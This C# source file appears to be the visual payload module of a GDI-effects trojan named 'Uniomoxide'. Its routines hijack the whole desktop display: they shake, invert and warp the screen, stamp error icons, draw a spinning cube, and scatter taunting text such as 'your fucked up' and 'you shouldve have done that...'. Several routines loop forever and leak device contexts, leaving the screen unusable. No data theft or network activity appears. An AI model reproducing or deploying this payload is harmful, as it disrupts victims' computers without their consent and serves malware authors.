using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Uniomoxide
{
    internal class GDI2
    {
        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("gdi32.dll")]
        public static extern IntPtr DeleteDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateSolidBrush(uint color);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int cx, int cy);

        [DllImport("gdi32.dll", SetLastError = true, EntryPoint = "GdiAlphaBlend")]
        public static extern bool AlphaBlend(IntPtr hdcDest, int xoriginDest, int yoriginDest, int wDest, int hDest, IntPtr hdcSrc, int xoriginSrc, int yoriginSrc, int wSrc, int hSrc, BLENDFUNCTION ftn);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool BitBlt(IntPtr hdc, int x, int y, int cx, int cy, IntPtr hdcSrc, int x1, int y1, uint rop);

        [DllImport("user32.dll")]
        public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);

        public const uint SRCCOPY = 0x00CC0020;
        public const uint SRCPAINT = 0x00EE0086;
        public const uint SRCAND = 0x008800C6;
        public const uint SRCINVERT = 0x00660046;
        public const uint SRCERASE = 0x00440328;
        public const uint NOTSRCCOPY = 0x00330008;
        public const uint NOTSRCERASE = 0x001100A6;
        public const uint MERGECOPY = 0x00C000CA;
        public const uint MERGEPAINT = 0x00BB0226;
        public const uint PATCOPY = 0x00F00021;
        public const uint PATPAINT = 0x00FB0A09;
        public const uint PATINVERT = 0x005A0049;
        public const uint DSTINVERT = 0x00550009;
        public const uint BLACKNESS = 0x00000042;
        public const uint WHITENESS = 0x00FF0062;
        public const uint CAPTUREBLT = 0x40000000;
        public const uint CUSTOM = 0x00100C85;
        private static readonly IntPtr NULL;

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool Rectangle(IntPtr hdc, int left, int top, int right, int bottom);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr DeleteObject(IntPtr ho);

        [DllImport("gdi32.dll")]
        public static extern bool PatBlt(IntPtr hdc, int x, int y, int width, int height, uint rop);

        [DllImport("user32.dll")]
        public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
        public delegate bool EnumWindowsProc(IntPtr hwnd, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern int GetSystemMetrics(int nIndex);

        [DllImport("user32.dll")]
        public static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        public static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern bool ExtractIconEx(string lpszFile, int nIconIndex, out IntPtr phiconLarge, out IntPtr phiconSmall, uint nIcons);

        [DllImport("user32.dll")]
        public static extern IntPtr LoadIcon(IntPtr hInstance, IntPtr lpIconName);

        [DllImport("user32.dll")]
        public static extern bool DrawIcon(IntPtr hdc, int x, int y, IntPtr hIcon);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, uint rop);

        [DllImport("gdi32.dll")] static extern IntPtr CreateDIBSection(IntPtr hdc, ref BITMAPINFO pbmi, uint iUsage, out IntPtr ppvBits, IntPtr hSection, uint dwOffset);

        static Random rnd = new Random();


        [StructLayout(LayoutKind.Sequential)]
        public struct BLENDFUNCTION
        {
            byte BlendOp;
            byte BlendFlags;
            byte SourceConstantAlpha;
            byte AlphaFormat;

            public BLENDFUNCTION(byte op, byte flags, byte alpha, byte format)
            {
                BlendOp = op;
                BlendFlags = flags;
                SourceConstantAlpha = alpha;
                AlphaFormat = format;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;

            public POINT(int x, int y)
            {
                this.X = x;
                this.Y = y;
            }

            public static implicit operator System.Drawing.Point(POINT p)
            {
                return new System.Drawing.Point(p.X, p.Y);
            }

            public static implicit operator POINT(System.Drawing.Point p)
            {
                return new POINT(p.X, p.Y);
            }
        }

        [DllImport("user32.dll")]
        public static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        public static Random rand = new Random();

        public static uint GetRandomHEXColor()
        {
            byte b = (byte)rand.Next(255);
            byte g = (byte)rand.Next(255);
            byte r = (byte)rand.Next(255);
            return (uint)((b << 16) | (g << 8) | r);
        }

        [StructLayout(LayoutKind.Sequential)]
        struct BITMAPINFO
        {
            public BITMAPINFOHEADER bmiHeader;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
            public uint[] bmiColors;
        }

        public static void SRCANDBlack()
        {
            DateTime startTime = DateTime.Now;
            TimeSpan maxDuration = TimeSpan.FromSeconds(30);    //duration of effect
            while (DateTime.Now - startTime < maxDuration)
            {
                // 30 SECS IT STOPS
                IntPtr hdc = GetDC(NULL);
                int width = GetSystemMetrics(0);
                int height = GetSystemMetrics(1);


                int x = rand.Next(-5, 5);
                int y = rand.Next(-5, 5);
                BitBlt(hdc, x, y, width, height, hdc, 0, 0, SRCCOPY);
                System.Threading.Thread.Sleep(5);
            }
        }

        public static void scrolling()
        {
            DateTime startTime = DateTime.Now;
            TimeSpan maxDuration = TimeSpan.FromSeconds(30);    //duration of effect
            while (DateTime.Now - startTime < maxDuration)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int width = GetSystemMetrics(0);
                int height = GetSystemMetrics(1);
                IntPtr hdcMem = CreateCompatibleDC(hdc);
                IntPtr hbmMem = CreateCompatibleBitmap(hdc, width, height);
                IntPtr hOld = SelectObject(hdcMem, hbmMem);
                BitBlt(hdc, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
                BitBlt(hdcMem, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
                StretchBlt(hdc, 0, 0, width, height, hdcMem, width / 4, height / 4, width / 2, height / 2, SRCCOPY);
            }
        }

        public static void TRODI()
        {
            DateTime startTime = DateTime.Now;
            TimeSpan maxDuration = TimeSpan.FromSeconds(90);    //duration of effect
            while (DateTime.Now - startTime < maxDuration)
            {
                IntPtr desk = GetDC(IntPtr.Zero);
                int sw = GetSystemMetrics(0);
                int sh = GetSystemMetrics(1);

                double angle = 0.0;

                while (DateTime.Now - startTime < maxDuration)
                {
                    double baseAngle = angle;

                    for (int y = 0; y < sh; y++)
                    {
                        int offset = (int)(Math.Sin(baseAngle) * 30);
                        BitBlt(desk, 0, y, sw, 1, desk, offset, y, SRCCOPY);
                        baseAngle += 0.10;
                    }

                    angle += 0.15;
                    Thread.Sleep(1);
                }
            }
        }

        public static void DrawLOLZ()
        {
            DateTime startTime = DateTime.Now;
            TimeSpan maxDuration = TimeSpan.FromSeconds(60);    //duration of effect
            while (DateTime.Now - startTime < maxDuration)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int width = GetSystemMetrics(0);
                int height = GetSystemMetrics(1);

                int x = rand.Next(0, width - 32);
                int y = rand.Next(0, height - 32);
                IntPtr hIcon = LoadIcon(IntPtr.Zero, new IntPtr(32513));
                DrawIcon(hdc, x, y, hIcon);
                System.Threading.Thread.Sleep(1);
            }
        }
        public static void InvertColor()
        {
            DateTime startTime = DateTime.Now;
            TimeSpan maxDuration = TimeSpan.FromSeconds(60);    //duration of effect
            while (DateTime.Now - startTime < maxDuration)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int width = GetSystemMetrics(0);
                int height = GetSystemMetrics(1);

                BitBlt(hdc, 0, 0, width, height, hdc, 0, 0, DSTINVERT);
                System.Threading.Thread.Sleep(5);
            }
        }

        public static void SRCANDBlack2()
        {
            while (true)
            {
                IntPtr hdc = GetDC(NULL);
                int width = GetSystemMetrics(0);
                int height = GetSystemMetrics(1);


                int x = rand.Next(-5, 5);
                int y = rand.Next(-5, 5);
                BitBlt(hdc, x, y, width, height, hdc, 0, 0, SRCCOPY);
                System.Threading.Thread.Sleep(5);
            }
        }

        public static void textgdi()
        {
            while (true)
            {
                IntPtr desktopDC = GetDC(IntPtr.Zero);
                Graphics g = Graphics.FromHdc(desktopDC);
                g.SmoothingMode = SmoothingMode.AntiAlias;
                string[] texts = {
            "you shouldve have done that...",
            "Uniomoxide.exe",
            "x0rUnrespond2",
            "your fucked up",
            "T.E.R.A"
        };
                Color[] colors = {
            Color.Red,
            Color.Green,
            Color.Blue,
            Color.Magenta,
            Color.Cyan
        };
                float[] angles = { -30f, 15f, 45f, -60f, 75f };
                int screenW = Screen.PrimaryScreen.Bounds.Width;
                int screenH = Screen.PrimaryScreen.Bounds.Height;
                while (true)
                {
                    for (int i = 0; i < 5; i++)
                    {
                        using (Font font = new Font("Arial", 67, FontStyle.Bold | FontStyle.Underline))
                        using (Brush brush = new SolidBrush(colors[i]))
                        {
                            g.ResetTransform();
                            int x = rnd.Next(0, screenW);
                            int y = rnd.Next(0, screenH);
                            g.TranslateTransform(x, y);
                            g.RotateTransform(angles[i]);
                            g.ScaleTransform(2.0f, 1.0f);
                            g.DrawString(texts[i], font, brush, 0, 0);
                        }
                    }

                    Thread.Sleep(100);
                }
            }
        }
        public static void dejato()
        {
            while (true)
            {
                IntPtr desk = GetDC(IntPtr.Zero);
                int sw = GetSystemMetrics(0);
                int sh = GetSystemMetrics(1);


                double angle = 0.0;

                double baseAngle = angle;

                for (int y = 0; y < sh; y++)
                {
                    int offset = (int)(Math.Tan(baseAngle) * 1);
                    BitBlt(desk, 0, y, sw, 1, desk, offset, y, SRCCOPY);
                    baseAngle += 0.01;
                }

                angle += 0.15;
                Thread.Sleep(1);
            }
        }
        public static void CUBE()
        {
            float ax = 0, ay = 0, az = 0;
            float px = 0, py = 0;
            PointF[] pts = new PointF[8];

            DateTime startTime = DateTime.Now;
            TimeSpan maxDuration = TimeSpan.FromSeconds(30);    //duration of effect
            while (DateTime.Now - startTime < maxDuration)
            {
                IntPtr desk = GetDC(IntPtr.Zero);
                int sw = GetSystemMetrics(0);
                int sh = GetSystemMetrics(1);

                using (Graphics g = Graphics.FromHdc(desk))
                {
                    float s = 80;
                    float[,] v =
                    {
                    { -s, -s, -s }, { s, -s, -s }, { s, s, -s }, { -s, s, -s },
                    { -s, -s, s }, { s, -s, s }, { s, s, s }, { -s, s, s }
                };

                    ax += 0.03f;
                    ay += 0.02f;
                    az += 0.04f;

                    px = (float)(Math.Sin(ax) * 150);
                    py = (float)(Math.Cos(ay) * 150);

                    for (int i = 0; i < 8; i++)
                    {
                        float x = v[i, 0], y = v[i, 1], z = v[i, 2];

                        float cy = (float)(y * Math.Cos(ax) - z * Math.Sin(ax));
                        float cz = (float)(y * Math.Sin(ax) + z * Math.Cos(ax));
                        float cx = x;

                        float cx2 = (float)(cx * Math.Cos(ay) + cz * Math.Sin(ay));
                        float cy2 = cy;
                        float cz2 = (float)(-cx * Math.Sin(ay) + cz * Math.Cos(ay));

                        float cx3 = (float)(cx2 * Math.Cos(az) - cy2 * Math.Sin(az));
                        float cy3 = (float)(cx2 * Math.Sin(az) + cy2 * Math.Cos(az));
                        float cz3 = cz2;

                        float f = 300 / (300 + cz3);
                        pts[i] = new PointF(
                            sw / 2 + cx3 * f + px,
                            sh / 2 + cy3 * f + py
                        );
                    }

                    int[][] edges =
                    {
                    new[]{0,1}, new[]{1,2}, new[]{2,3}, new[]{3,0},
                    new[]{4,5}, new[]{5,6}, new[]{6,7}, new[]{7,4},
                    new[]{0,4}, new[]{1,5}, new[]{2,6}, new[]{3,7}
                };

                    using (Pen p = new Pen(Color.Cyan, 2))
                        foreach (var e2 in edges)
                            g.DrawLine(p, pts[e2[0]], pts[e2[1]]);
                }

                ReleaseDC(IntPtr.Zero, desk);
            }
        }
        public static void hi()
        {
            IntPtr sdc = GetDC(IntPtr.Zero);

            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);

            IntPtr src = CreateCompatibleDC(sdc);

            BITMAPINFO bi = new BITMAPINFO();
            bi.bmiColors = new uint[256];
            bi.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER));
            bi.bmiHeader.biWidth = w;
            bi.bmiHeader.biHeight = -h;
            bi.bmiHeader.biPlanes = 1;
            bi.bmiHeader.biBitCount = 32;
            bi.bmiHeader.biCompression = 0;

            IntPtr sbits;
            IntPtr sbmp = CreateDIBSection(sdc, ref bi, 0, out sbits, IntPtr.Zero, 0);
            SelectObject(src, sbmp);

            BitBlt(src, 0, 0, w, h, sdc, 0, 0, SRCCOPY);

            double t = 0;

            while (true)
            {
                t += 0.30;

                for (int x = 0; x < w; x++)
                {
                    double off = Math.Tan(t + x * 0.009) * 32.0;
                    BitBlt(sdc, x, (int)off, 1, h, src, x, 0, SRCCOPY);
                }

                Thread.Sleep(1);
            }
        }
    }
}